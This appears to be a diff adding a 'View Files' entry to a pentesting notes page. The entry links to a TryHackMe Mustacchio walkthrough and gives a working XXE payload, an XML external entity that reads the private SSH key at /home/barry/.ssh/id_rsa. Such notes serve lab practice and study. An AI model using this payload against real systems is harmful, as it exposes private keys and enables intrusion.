@@ -83,7 +83,23 @@ Content-Length: 91
 
 <figure><img src="../../.gitbook/assets/image (19) (2).png" alt=""><figcaption></figcaption></figure>
 
+### View Files
 
+**Examples**
+
+[mustacchio.md](../../walkthroughs/tryhackme/mustacchio.md "mention")
+
+**Input**
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
+<comment>
+  <name>Joe Hamd</name>
+  <author>Barry Clad</author>
+  <com>&xxe;</com>
+</comment>
+```
 
 
 
